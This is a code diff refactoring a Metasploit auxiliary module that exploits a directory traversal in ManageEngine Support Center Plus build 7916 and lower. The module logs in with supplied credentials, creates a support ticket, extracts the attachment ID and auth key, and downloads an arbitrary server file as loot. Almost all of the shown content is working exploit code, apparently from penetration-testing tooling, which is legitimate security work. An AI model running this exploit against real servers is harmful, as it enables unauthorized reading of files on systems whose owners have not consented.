@@ -14,7 +14,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "ManageEngine Support Center Plus 7916 Directory Traversal",
+      'Name'           => "ManageEngine Support Center Plus Directory Traversal",
       'Description'    => %q{
         This module exploits a directory traversal vulnerability found in ManageEngine
         Support Center Plus build 7916 and lower. The module will create a support ticket
@@ -27,8 +27,10 @@ class Metasploit3 < Msf::Auxiliary
       'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
       'References'     =>
         [
+          [ 'EDB', '31262' ],
+          [ 'URL', 'http://packetstormsecurity.com/files/124975/ManageEngine-Support-Center-Plus-7916-Directory-Traversal.html' ]
         ],
-      'Platform'       => ['java'],
+      'Platform'       => 'java',
       'Arch'           => ARCH_JAVA,
       'Targets'        => 'Support Center Plus',
       'Privileged'     => true,
@@ -55,31 +57,32 @@ class Metasploit3 < Msf::Auxiliary
       'uri'    => normalize_uri(uri, ""),
     })
 
-    if res.code == 200
-      if (res.headers['Set-Cookie'] =~ /JSESSIONID=([a-zA-Z0-9]+)/)
-        session = $1
-        print_status("#{peer} - Session cookie is [ #{session} ]")
-      else
-        print_error("#{peer} - Session cookie not found!")
-      end
+    if res and res.code == 200
+      session = res.get_cookies
     else
       print_error("#{peer} - Server returned #{res.code.to_s}")
     end
 
-    post_data = "j_username=#{datastore['USER']}&j_password=#{datastore['PASS']}&logonDomainName=undefined&sso_status=false&loginButton=Login"
-      print_status("#{peer} - Logging in as user [ #{datastore['USER']} ]")
-      res = send_request_cgi({
-        'method' => 'POST',
-        'uri'    => normalize_uri(uri, "j_security_check"),
-        'cookie' => "JSESSIONID=#{session}",
-        'data'   => post_data
-      })
+    print_status("#{peer} - Logging in as user [ #{datastore['USER']} ]")
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(uri, "j_security_check"),
+      'cookie' => session,
+      'vars_post' =>
+      {
+        'j_username' => datastore['USER'],
+        'j_password' => datastore['PASS'],
+        'logonDomainName' => 'undefined',
+        'sso_status' => 'false',
+        'loginButton' => 'Login'
+      }
+    })
 
-    if not res or res.code != 302
+    if res and res.code == 302
+      print_status("#{peer} - Login succesful")
+    else
       print_error("#{peer} - Login was not succesful!")
       return
-    else
-      print_status("#{peer} - Login succesful")
     end
 
     randomname = Rex::Text.rand_text_alphanumeric(10)
@@ -87,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'uri'    => normalize_uri(uri, "WorkOrder.do"),
-      'cookie' => "JSESSIONID=#{session}",
+      'cookie' => session,
       'vars_post' =>
         {
           'reqTemplate' => '',
@@ -113,10 +116,7 @@ class Metasploit3 < Msf::Auxiliary
         }
       })
 
-    if not res or res.code != 200
-      print_error("#{peer} - Ticket not created due to error!")
-      return
-    else
+    if res and res.code == 200
       print_status("#{peer} - Ticket created")
       if (res.body =~ /FileDownload.jsp\?module=Request\&ID=(\d+)\&authKey=(.*)\" class=/)
         fileid = $1
@@ -126,19 +126,26 @@ class Metasploit3 < Msf::Auxiliary
       else
         print_error("#{peer} - File ID and AuthKey not found!")
       end
+    else
+      print_error("#{peer} - Ticket not created due to error!")
+      return
     end
 
     print_status("#{peer} - Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]")
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(uri, "workorder", "FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey}")
+      'uri' => normalize_uri(uri, "workorder", "FileDownload.jsp"),
+      'vars_get' =>
+      {
+        'module' => 'Request',
+        'ID' => fileid,
+        'authKey' => fileauthkey
+      }
     })
 
     # If we don't get a 200 when we request our malicious payload, we suspect
     # we don't have a shell, either.  Print the status code for debugging purposes.
-    if res and res.code != 200
-      print_error("#{peer} - Server returned #{res.code.to_s}")
-    else
+    if res and res.code == 200
       data = res.body
       p = store_loot(
         'manageengine.supportcenterplus',
@@ -148,6 +155,8 @@ class Metasploit3 < Msf::Auxiliary
         datastore['FILE']
       )
       print_good("#{peer} - [ #{datastore['FILE']} ] loot stored as [ #{p} ]")
+    else
+      print_error("#{peer} - Server returned #{res.code.to_s}")
     end
   end
 end
